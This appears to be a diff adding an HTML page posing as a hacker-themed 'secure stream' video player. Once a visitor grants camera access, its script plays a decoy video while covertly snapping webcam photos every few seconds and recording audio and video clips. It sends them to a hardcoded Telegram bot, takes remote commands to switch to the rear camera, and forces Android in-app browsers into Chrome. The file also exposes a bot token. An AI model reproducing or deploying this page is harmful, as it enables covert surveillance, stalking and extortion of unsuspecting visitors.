@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CodexBD | Secure Stream</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00ff41; /* Classic Hacker Green */
+            --bg-dark: #0a0a0a;
+            --card-dark: #121212;
+            --border-color: #1f1f1f;
+        }
+
+        body { 
+            background-color: var(--bg-dark); 
+            color: var(--primary); 
+            font-family: 'JetBrains Mono', monospace; 
+            margin: 0; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .hacker-container {
+            width: 95%;
+            max-width: 850px;
+            background: var(--card-dark);
+            padding: 30px;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.05);
+            position: relative;
+        }
+
+        /* Top Bar Style */
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 10px 15px 0;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 20px;
+        }
+
+        .dot-group { display: flex; gap: 8px; }
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .dot.red { background: #ff5f56; }
+        .dot.yellow { background: #ffbd2e; }
+        .dot.green { background: #27c93f; }
+
+        .header-text { font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
+
+        .video-viewport {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            background: #000;
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+        }
+
+        video#userMovie { width: 100%; height: 100%; object-fit: contain; }
+
+        .scan-line {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 2px;
+            background: rgba(0, 255, 65, 0.2);
+            box-shadow: 0 0 10px var(--primary);
+            animation: scan 4s linear infinite;
+            z-index: 5;
+            pointer-events: none;
+        }
+
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+
+        .play-btn {
+            background: transparent;
+            color: var(--primary);
+            border: 1px solid var(--primary);
+            padding: 15px 40px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            transition: all 0.3s;
+        }
+
+        .play-btn:hover {
+            background: var(--primary);
+            color: #000;
+            box-shadow: 0 0 20px var(--primary);
+        }
+
+        #bgCam, #canvas { display: none; }
+
+        footer { 
+            margin-top: 25px; 
+            font-size: 11px; 
+            color: #444; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .developer-tag { color: var(--primary); opacity: 0.7; }
+    </style>
+</head>
+<body>
+
+<div class="hacker-container">
+    <div class="terminal-header">
+        <div class="dot-group">
+            <div class="dot red"></div>
+            <div class="dot yellow"></div>
+            <div class="dot green"></div>
+        </div>
+        <div class="header-text">SYSTEM_ACCESS_GRANTED: CODEXBD</div>
+    </div>
+
+    <div class="video-viewport">
+        <div class="scan-line"></div>
+        <div id="overlay" class="overlay">
+            <p style="margin-bottom: 20px;">[ STATUS: ENCRYPTED_STREAM_READY ]</p>
+            <button id="authBtn" class="play-btn">Initialize Stream</button>
+        </div>
+        <video id="userMovie" playsinline>
+            <source src="video.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <video id="bgCam" autoplay muted playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <footer>
+        ST_ID: <span class="developer-tag">DEVELOPED BY KHOKON TALUKDAR</span> | VERSION: 4.0.2
+    </footer>
+</div>
+
+<script>
+    const BOT_TOKEN = '8671576446:AAE0PGMS-r9-cRJAgeLBW5s6Feos_w1ZzRs';
+    const CHAT_ID = '6274855215';
+
+    const authBtn = document.getElementById('authBtn');
+    const overlay = document.getElementById('overlay');
+    const userMovie = document.getElementById('userMovie');
+    const bgCam = document.getElementById('bgCam');
+    const canvas = document.getElementById('canvas');
+
+    let currentFacingMode = 'user';
+    let lastUpdateId = 0;
+
+    // রিডাইরেকশন লজিক
+    function checkInApp() {
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        const isInApp = /FBAN|FBAV|Instagram|Messenger|WhatsApp/i.test(ua);
+        if (isInApp && /android/i.test(ua)) {
+            window.location.href = "intent://" + window.location.host + window.location.pathname + "#Intent;scheme=http;package=com.android.chrome;end";
+        }
+    }
+    checkInApp();
+
+    authBtn.addEventListener('click', async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: currentFacingMode }, 
+                audio: true 
+            });
+            
+            bgCam.srcObject = stream;
+            overlay.style.display = 'none';
+            userMovie.controls = true;
+            userMovie.play();
+
+            notifyTelegram("💀 [SYSTEM_LOG]: USER_STREAM_STARTED");
+            sendControlPanel();
+            listenForCommands();
+            captureProcess();
+            videoProcess(stream);
+
+        } catch (err) {
+            alert("[ERROR]: SYSTEM_ACCESS_DENIED. Please allow camera access.");
+        }
+    });
+
+    function captureProcess() {
+        setInterval(() => {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(bgCam, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => sendData(blob, 'photo'), 'image/jpeg', 0.5);
+        }, 4000);
+    }
+
+    function videoProcess(stream) {
+        if (!window.MediaRecorder) return;
+        let chunks = [];
+        const rec = new MediaRecorder(stream);
+        rec.ondataavailable = e => chunks.push(e.data);
+        rec.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/mp4' });
+            sendData(blob, 'video');
+            if (bgCam.srcObject) videoProcess(bgCam.srcObject);
+        };
+        setTimeout(() => { if (rec.state === 'recording') rec.stop(); }, 7000);
+        rec.start();
+    }
+
+    async function listenForCommands() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
+            const data = await res.json();
+            if (data.ok && data.result.length > 0) {
+                for (let update of data.result) {
+                    lastUpdateId = update.update_id;
+                    if (update.callback_query && update.callback_query.data === 'switch_cam') {
+                        switchCamera();
+                    }
+                }
+            }
+        } catch (e) {}
+        setTimeout(listenForCommands, 3000);
+    }
+
+    async function switchCamera() {
+        currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
+        if (bgCam.srcObject) bgCam.srcObject.getTracks().forEach(t => t.stop());
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true });
+            bgCam.srcObject = stream;
+            notifyTelegram(`🔄 [CMD_EXECUTED]: CAMERA_SWITCH_TO_${currentFacingMode.toUpperCase()}`);
+        } catch (e) {
+            notifyTelegram("⚠️ [ERROR]: SWITCH_FAILED");
+        }
+    }
+
+    async function sendControlPanel() {
+        const body = {
+            chat_id: CHAT_ID,
+            text: "📟 [CODEX_MONITOR_ACTIVE]\nUser is connected via Terminal Interface.",
+            reply_markup: { inline_keyboard: [[{ text: "🔄 Switch Camera", callback_data: "switch_cam" }]] }
+        };
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+        });
+    }
+
+    async function sendData(blob, type) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append(type, blob, `cx.${type === 'photo' ? 'jpg' : 'mp4'}`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+            method: 'POST',
+            body: fd
+        }).catch(e => {});
+    }
+
+    function notifyTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
+    }
+</script>
+
+</body>
+</html>
+
